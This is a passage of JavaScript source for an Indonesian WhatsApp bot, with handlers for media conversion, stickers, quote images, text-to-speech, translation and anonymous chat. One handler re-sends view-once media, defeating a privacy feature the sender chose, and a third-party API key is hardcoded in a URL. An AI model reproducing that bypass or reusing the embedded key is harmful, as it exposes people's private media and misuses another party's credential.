if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'hdvid': {
if (!isCreator&&!isPremium) return tolakk('Fitur khusus user premium!')
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
addCountCmd('hdvid', m.sender, _cmd)
 if (!/video/.test(mime)) return warning (`Reply Video Yang Ingin Dijadikan HD Dengan Caption ${prefix + command}`)
if (!quoted) return warning(`Reply Video Yang Ingin Dijadikan HD Dengan Caption ${prefix + command}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let output = getRandom('.mp4')
const media = await vreden.downloadAndSaveMediaMessage(quoted)
ffmpeg(media)
    .outputOptions('-s', '1280x720') // Ganti resolusi sesuai kebutuhan, contoh disini menggunakan 1280x720
    .save(output)
    .on('end', () => {
      // Mengirim video yang telah ditingkatkan resolusinya
vreden.sendMessage(m.chat, { video: fs.readFileSync(output), caption: "Nih!",gifPlayback: false},{quoted: m})
    })
    .on('error', (err) => {
      console.error(err)
      m.reply('Terjadi kesalahan saat meningkatkan resolusi video. ' + err)
    })
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'kompres': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
addCountCmd('kompres', m.sender, _cmd)
 if (!/video/.test(mime)) return warning (`Reply Video Yang Ingin Diperkecil Dengan Caption ${prefix + command}`)
if (!quoted) return warning(`Reply Video Yang Ingin Diperkecil Dengan Caption ${prefix + command}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let output = getRandom('.mp4')
const media = await vreden.downloadAndSaveMediaMessage(quoted)
ffmpeg(media)
    .outputOptions('-s', '640x360') // Ganti resolusi sesuai kebutuhan, contoh disini menggunakan 1280x720
    .save(output)
    .on('end', () => {
      // Mengirim video yang telah ditingkatkan resolusinya
vreden.sendMessage(m.chat, { video: fs.readFileSync(output), caption: "Nih!",gifPlayback: false},{quoted: m})
    })
    .on('error', (err) => {
      console.error(err)
      m.reply('Terjadi kesalahan saat menurunkan resolusi video. ' + err)
    })
}
db.data.users[m.sender].exp += await randomNomor(20)
break
//━━━━━━━━━━━━━━━[ CONVERT ]━━━━━━━━━━━━━━━━━//
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let media = await vreden.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply(err)
let buff = fs.readFileSync(ran)
vreden.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
m.reply(e)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
//━━━━━━━━━━━━━━━[ STICKER ]━━━━━━━━━━━━━━━━━//
case 'patrick': case 'doge': case 'popoci': case 'sponsbob': case 'kawan-sponsbob': case 'awoawo': case 'chat': case 'dbfly': case 'dino-kuning': case 'gojosatoru': case 'hope-boy': case 'jisoo': case 'kr-robot': case 'kucing': case 'manusia-lidi': case 'menjamet': case 'meow': case 'nicholas': case 'tyni': 
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
let dinoo = `https://api.zeeoneofc.my.id/api/telegram-sticker/${command}?apikey=${setting.BotKey}`
let dino = await getBuffer(dinoo)
vreden.imgToSticker(m.chat, dino, m, {packname: `Sticker Maker\nNomor Bot :` , author: `${botName}\n${ownnomor}` })
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
break// Fix Qioo
case 'qckode': case 'qcwarna': case 'qccode': {
warning(`Contoh: ${prefix}qc pink hallo\n\n*List Warna*\npink\nbiru\nmerah\nhijau\nkuning\nungu\nbirutua\nbirumuda\nabu\norange\nhitam\nputih\nteal\nmerahmuda\ncokelat\nsalmon\nmagenta\ntan\nwheat\ndeeppink\napi\nbirulangit\njingga\nbirulangitcerah\nhotpink\nbirumudalangit\nhijaulaut\nmerahtua\noranyemerah\ncyan\nungutua\nhijaulumut\nhijaugelap\nbirulaut\noranyetua\nungukehitaman\nfuchsia\nmagentagelap\nabu-abutua\npeachpuff\nhijautua\nmerahgelap\ngoldenrod\nabu-abutua\nungugelap\nemas\nperak`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'qc':{ 
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} pink hallo\n\nlist warna\npink\nbiru\nmerah\nhijau\nkuning\nungu\nbirutua\nbirumuda\nabu\norange\nhitam\nputih\nteal\nmerahmuda\ncokelat\nsalmon\nmagenta\ntan\nwheat\ndeeppink\napi\nbirulangit\njingga\nbirulangitcerah\nhotpink\nbirumudalangit\nhijaulaut\nmerahtua\noranyemerah\ncyan\nungutua\nhijaulumut\nhijaugelap\nbirulaut\noranyetua\nungukehitaman\nfuchsia\nmagentagelap\nabu-abutua\npeachpuff\nhijautua\nmerahgelap\ngoldenrod\nabu-abutua\nungugelap\nemas\nperak`)
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink':
backgroundColor = '#f68ac9';
break;
case 'biru':
backgroundColor = '#6cace4';
break;
case 'merah':
backgroundColor = '#f44336';
break;
case 'hijau':
backgroundColor = '#4caf50';
break;
case 'kuning':
backgroundColor = '#ffeb3b';
break;
case 'ungu':
backgroundColor = '#9c27b0';
break;
case 'birutua':
backgroundColor = '#0d47a1';
break;
case 'birumuda':
backgroundColor = '#03a9f4'; 
break;
case 'abu':
backgroundColor = '#9e9e9e';
break;
case 'orange':
backgroundColor = '#ff9800';
break;
case 'hitam':
backgroundColor = '#000000';
break;
case 'putih':
backgroundColor = '#ffffff';
break;
case 'teal':
backgroundColor = '#008080';
break;
case 'merahmuda':
backgroundColor = '#FFC0CB';
break;
case 'cokelat':
backgroundColor = '#A52A2A';
case 'salmon':
backgroundColor = '#FFA07A'; 
break; 
case 'magenta':
backgroundColor = '#FF00FF'; 
break; 
case 'tan':
backgroundColor = '#D2B48C'; 
break;
case 'wheat':
backgroundColor = '#F5DEB3'; 
break;
case 'deeppink':
backgroundColor = '#FF1493'; 
break; 
case 'api':
backgroundColor = '#B22222';
break;
case 'birulangit':
backgroundColor = '#00BFFF';
break; 
case 'jingga':
backgroundColor = '#FF7F50';
break;
case 'birulangitcerah':
backgroundColor = '#1E90FF'; 
break; 
case 'hotpink':
backgroundColor = '#FF69B4'; 
break; 
case 'birumudalangit':
backgroundColor = '#87CEEB'; 
break; 
case 'hijaulaut':
backgroundColor = '#20B2AA'; 
break; 
case 'merahtua':
backgroundColor = '#8B0000'; 
break; 
case 'oranyemerah':
backgroundColor = '#FF4500'; 
break; 
case 'cyan':
backgroundColor = '#48D1CC'; 
break; 
case 'ungutua':
backgroundColor = '#BA55D3'; 
break; 
case 'hijaulumut':
backgroundColor = '#00FF7F'; 
break; 
case 'hijaugelap':
backgroundColor = '#008000'; 
break; 
case 'birulaut':
backgroundColor = '#191970'; 
break; 
case 'oranyetua':
backgroundColor = '#FF8C00'; 
break; 
case 'ungukehitaman':
backgroundColor = '#9400D3'; 
break; 
case 'fuchsia':
backgroundColor = '#FF00FF'; 
break; 
case 'magentagelap':
backgroundColor = '#8B008B'; 
break;
case 'abu-abutua':
backgroundColor = '#2F4F4F'; 
break;
case 'peachpuff':
backgroundColor = '#FFDAB9'; 
break;
case 'hijautua':
backgroundColor = '#BDB76B'; 
break;
case 'merahgelap':
backgroundColor = '#DC143C'; 
break;
case 'goldenrod':
backgroundColor = '#DAA520'; 
break;
case 'abu-abutua':
backgroundColor = '#696969'; 
break;
case 'ungugelap':
backgroundColor = '#483D8B'; 
break;
case 'emas':
backgroundColor = '#FFD700'; 
break;
case 'perak':
backgroundColor = '#C0C0C0'; 
break;
default:
backgroundColor = '#ffffff';
message = text
} 
try {
avatar = await vreden.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image")
} catch {
avatar = 'https://telegra.ph/file/c3f3d2c2548cbefef1604.jpg'
}
const json = {
type: "quote",
format: "png",
backgroundColor,
width: 700,
height: 580,
scale: 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": avatar
}
},
"text": message,
"m.replyMessage": {}
}
 ],
};
axios
.post(
"https://quotly.netorare.codes/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const qc = Buffer.from(res.data.result.image, "base64");
vreden.imgToSticker(m.chat, qc, m, {packname: `Sticker Maker\nNomor Bot :` , author: `${botName}\n${ownnomor}` })
})
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'lonte':  
if (!isCreator&&!isPremium) return tolakk(mess.OnlyPrem)
let lontee = `https://api.zeeoneofc.my.id/api/telegram-sticker/${command}?apikey=${setting.BotKey}`
var lonte = await getBuffer(lontee)
vreden.imgToSticker(m.chat, lonte, m, {packname: `Sticker Maker\nNomor Bot :` , author: `${botName}\n${ownnomor}` })
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
break// Fix Qioo
case 'stiker': case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
addCountCmd('sticker', m.sender, _cmd)
if (!quoted) return warning(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await vreden.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await vreden.imgToSticker(m.chat, media, m, { packname: `Sticker Maker\nNomor Bot :` , author: `${botName}\n${ownnomor}` })
await fs.unlinkSync(media)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return warning('Maksimal 10 detik!')
let media = await vreden.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await vreden.vidToSticker(m.chat, media, m, { packname: `Sticker Maker\nNomor Bot :` , author: `${botName}\n${ownnomor}` })
await fs.unlinkSync(media)
} else if (/sticker/.test(mime)) {
let media = await vreden.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await vreden.imgToSticker(m.chat, media, m, {packname: `Sticker Maker\nNomor Bot :` , author: `${botName}\n${ownnomor}` })
await fs.unlinkSync(media)
} else m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'stickerwm': case 'swm': case 'stickergifwm': case 'sgifwm': case 'wm': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!isPremium) return tolakk(mess.OnlyPrem)
if (!quoted) return warning(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
addCountCmd('stickerwm', m.sender, _cmd)
let [teks1, teks2] = text.split`|`
if (!teks1) return warning(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
if (!teks2) return warning(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
if (/image/.test(mime)) {
let media = await quoted.download()
vreden.imgToSticker(m.chat, media, m, {packname: `${teks1}`, author: `${teks2}`})
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return warning('Maksimal 10 detik!')
let media = await quoted.download()
vreden.imgToSticker(m.chat, media, m, {packname: `${teks1}`, author: `${teks2}`})
} else {
m.reply(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
}
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'stikersearch': case 'stiksearch': case 'searchstik': case 'caristicker': case 'caristiker': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} yaya`)
let anu = await stickerSearch(text)
for (let stik of anu.sticker) {
var stk = await getBuffer(stik)
await vreden.imgToSticker(m.chat, stk, m, { packname: `Sticker Maker\nNomor Bot :` , author: `${botName}\n${ownnomor}` })
await sleep(3000)
}
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
break 
case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
addCountCmd('smeme', m.sender, _cmd)
 if (!/webp/.test(mime) && /image/.test(mime)) {
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await vreden.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
let smemee = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
var smeme = await getBuffer(smemee)
await vreden.imgToSticker(m.chat, smeme, m, { packname: `Sticker Maker\nNomor Bot :` , author: `${botName}\n${ownnomor}` })
} else {
m.reply(`Kirim/reply image dengan caption ${prefix + command} text1|text2`)
}
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
break 
case 'getpp': {
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
try {
avatar = await vreden.profilePictureUrl(users, "image")
} catch {
avatar = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
vreden.sendMessage(m.chat, { image: { url: avatar }, caption: `*Action :* [ V1 ] Get PP 🔎\n*Result :* Succes ✅\n` }, { quoted: m })
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'getppgc': {
if (!m.isGroup) return warning(mess.OnlyGrup)
try {
avatar = await vreden.profilePictureUrl(m.chat, "image")
} catch {
avatar = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
vreden.sendMessage(m.chat, { image: { url: avatar }, caption: `*Action :* [ V1 ] Get PP 🔎\n*Result :* Succes ✅\n` }, { quoted: m })
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'getname': {
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let name = vreden.getName(users)
balas(`${name}`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'getnamegc': case 'getsubjekgc': {
if (!m.isGroup) return warning(mess.OnlyGrup)
balas(`${groupName}`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'getdesk': case 'getdeskripsigc': case 'getdesc': {
if (!m.isGroup) return warning(mess.OnlyGrup)
let iya = `DESKRIPSI GRUB *${groupName}*\n\n${groupMetadata.desc}`
balas(iya)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'cekid': case 'getid': case 'getidgrup': case 'getidgc': case 'cekidgc': {
if (!m.isGroup) return warning(mess.OnlyGrup)
let tod = `*GET ID GRUB*\n${groupMetadata.id}\n\n*GRUB NAME :* ${groupName}`
balas(tod)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tourl':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!quoted) return warning('Reply Image')
if (!mime) return m.reply(`Kirim Video/Image Dengan Caption ${prefix + command}`)
m.reply('Proses') 
let media = await vreden.downloadAndSaveMediaMessage(quoted);
if (/image|video/.test(mime)) {
let anu = await TelegraPh(media);
m.reply(`*Link* : ${anu}`);
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media);
m.reply(`*Hash* : ${anu.hash}\n*File Name* : ${anu.filename}\n*Link* : ${anu.url}\n*Size* : ${bytesToSize(anu.size)}\n`);
} else {
m.reply(`Jenis media tidak support`)
}
await fs.unlinkSync(media);
}
break;
case 'tomp4': case 'tovideo': {
var media = await vreden.downloadAndSaveMediaMessage(quoted, new Date * 1)
let webpToMp4 = await webp2mp4File(media)
vreden.sendMessage(from, { video: {url: webpToMp4.result}, caption: 'Convert Sticker To Video'}, { quoted: fconver })
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
break//Fix Qioo
case 'toimage': case 'toimg': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
addCountCmd('toimage', m.sender, _cmd)
if (!quoted) return warning('Reply Image')
if (!/webp/.test(mime)) return warning (`Balas sticker dengan caption *${prefix + command}*`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let media = await vreden.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
vreden.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'readvo': case 'readviewonce': {
if (!m.quoted) return warning('Reply gambar/video yang ingin Anda lihat')
  if (m.quoted.mtype !== 'viewOnceMessageV2') return warning('Ini bukan pesan view-once.')
  let msg = m.quoted.message
  let type = Object.keys(msg)[0]
  let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
  let buffer = Buffer.from([])
  for await (const chunk of media) {
    buffer = Buffer.concat([buffer, chunk])
  }
  if (/video/.test(type)) {
    return vreden.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
  } else if (/image/.test(type)) {
    return vreden.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
  }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'toptv':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
const { toPTT } = require('./lib/converter')
const { MessageType } = require('@whiskeysockets/baileys')
  let q = m.quoted ? m.quoted : m
  if (!/video|audio/.test(mime)) return warning(`Balas video atau voice note yang ingin diubah ke mp3 dengan caption *${prefix + command}*`)
  let media = await q.download()
let dataVideo = { ptvMessage: m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage }
vreden.relayMessage(m.chat, dataVideo, {})
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 } 
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tovn': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
addCountCmd('tovn', m.sender, _cmd)
 if (!/video/.test(mime) && !/audio/.test(mime)) return warning (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return warning (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
vreden.sendMessage(m.chat, {audio, mimetype:'audio/mpeg', ptt: true}, { quoted : m })
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'toaudio': case 'tomp3':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
addCountCmd('tomp3', m.sender, _cmd)
 if (!/video/.test(mime) && !/audio/.test(mime)) return warning (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return warning (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
vreden.sendMessage(m.chat, {audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ttp': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
addCountCmd('ttp', m.sender, _cmd)
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
if(text.length > 20) return warning("Maksimal 20 karakter")
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
const ttp = require('./lib/text2picture')
let tpp = await ttp.ttp(text)
var ttpp = await getBuffer(tpp[0].url)
await vreden.imgToSticker(m.chat, ttpp, m, { packname: `Sticker Maker\nNomor Bot :` , author: `${botName}\n${ownnomor}` })
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'attp': {//Fix Qioo
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
addCountCmd('attp', m.sender, _cmd)
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
if(text.length > 20) return warning("Maksimal 20 karakter")
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
const ttp = require('./lib/text2picture')
let tpp = await ttp.attp(text)
var ttpp = await getBuffer(tpp[0].url)
await vreden.imgToSticker(m.chat, ttpp, m, { packname: `Sticker Maker\nNomor Bot :` , author: `${botName}\n${ownnomor}` })
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'emojimix': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
addCountCmd('emojimix', m.sender, _cmd)
let [emoji1, emoji2] = text.split`+`
if (!emoji1) return warning(`Contoh:\n${prefix + command} 😅+💩`)
if (!emoji2) return warning(`Contoh:\n${prefix + command} 😅+💩`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
var emj = await getBuffer(res.url)
let encmedia = await vreden.imgToSticker(m.chat, emj, m, { packname: `Sticker Maker\nNomor Bot :` , author: `${botName}\n${ownnomor}`, categories: res.tags })
}
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tts': case 'texttosound': case 'audio': case 'say':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} yaya`)
var lang = text.split("--")[1]
if (!lang) lang = 'id'
long = 'id'
function tts(text, long = 'id') {
//console.log(lang, text)
return new Promise((resolve, reject) => {
try {
let tts = gtts(long)
let filePath = path.join(__dirname, './lib', (1 * new Date) + '.wav')
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
}

let res
try { res = await tts(text, long) }
catch (e) {
m.reply(e + '')
res = await tts(text)
} finally {
if (/texttosound/.test(command)) vreden.sendMessage(m.chat, {audio: res, mimetype:'audio/mpeg'}, {quoted:m})
if (/tts/.test(command)) vreden.sendMessage(m.chat, {audio: res, mimetype:'audio/mpeg'}, {quoted:m})
if (/audio/.test(command)) vreden.sendMessage(m.chat, {audio: res, mimetype:'audio/mpeg'}, {quoted:m})
if (/say/.test(command)) vreden.sendMessage(m.chat, {audio: res, mimetype: 'audio/mpeg', ptt: true}, {})
}
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'translate': case 'tr': {
if (!text) return warning(`*Masukan Input Query!*\n\nContoh :

1. Kirim perintah ${prefix + command} *kode bahasa* *teks*
• Contoh:\n${prefix + command} id halo
2. Reply chat dengan caption ${prefix + command} *kode bahasa*
• Contoh:\n${prefix + command} id halo
Daftar bahasa yang di dukung : https://cloud.google.com/translate/docs/languages`)
try {
let teks = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
translate(teks, { to: args[0] }).then((res) => {
vreden.sendText(m.chat, `${res.text}`, m)
})
} catch (e) {
m.reply(`Contoh :

1. Kirim perintah ${prefix + command} *kode bahasa* *teks*
• Contoh:\n${prefix + command} id halo
2. Reply chat dengan caption ${prefix + command} *kode bahasa*
• Contoh:\n${prefix + command} id halo
Daftar bahasa yang di dukung : https://cloud.google.com/translate/docs/languages`)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break

case 'anonymouschat': {
if (m.isGroup) return warning('Fitur Tidak Dapat Digunakan Untuk Group!')
m.reply(`Hi ${db.data.users[m.sender].nama} Welcome To Anonymous Chat\n\n${prefix}start -- _mencari partner_`)
 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'keluar': case 'leave': {
if (m.isGroup) return warning('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!room) {
m.reply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
throw false
}
m.reply('Berhasil keluar dari anonymous chat')
let other = room.other(m.sender)
if (other) await vreden.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[room.id]
if (command === 'leave') 
db.data.users[m.sender].exp += await randomNomor(20)
break
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'mulai': case 'start': {
if (m.isGroup) return warning('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
m.reply(`Kamu Masih Berada Di dalam Sesi Anonymous\n\n${prefix}keluar -- _keluar dari sesi chat_`)
throw false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
vreden.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
m.reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
m.reply(`Mohon Tunggu Sedang Mencari Partner`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
}
case 'next': case 'lanjut': {
if (m.isGroup) return warning('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
